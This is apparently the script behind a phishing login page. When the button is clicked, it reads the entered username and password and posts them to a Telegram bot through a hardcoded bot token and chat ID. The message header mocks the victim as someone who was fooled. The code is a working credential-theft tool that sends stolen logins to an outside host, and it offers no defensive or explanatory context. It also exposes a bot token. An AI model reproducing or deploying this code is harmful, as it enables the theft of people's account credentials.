
const token = '5940709122:AAEnMAmgzOtXNKwys8roviVM6qVWBKyqRcg'
const CHAT_ID = '-1001920456747'
const URL = `https://api.telegram.org/bot${token}/sendMessage`

const input = document.querySelector("#name")
const input_password = document.querySelector("#password")
const button = document.querySelector(".btn")


button.addEventListener('click' , function (e) {
    e.preventDefault()
    inputValue = input.value
    passwordValue = input_password.value
    console.log(inputValue)
    console.log(passwordValue)

    
    let message = `
    <b>Йеб койган болани аккаунти:</b> \n
    <b>аккаунт логин: ${inputValue} \n</b> \n
    <b>аккаунт пароль: ${passwordValue} </b> \n
    `
    axios.post(URL, {
        chat_id: CHAT_ID,
        parse_mode: 'html',
        text: message
    })
})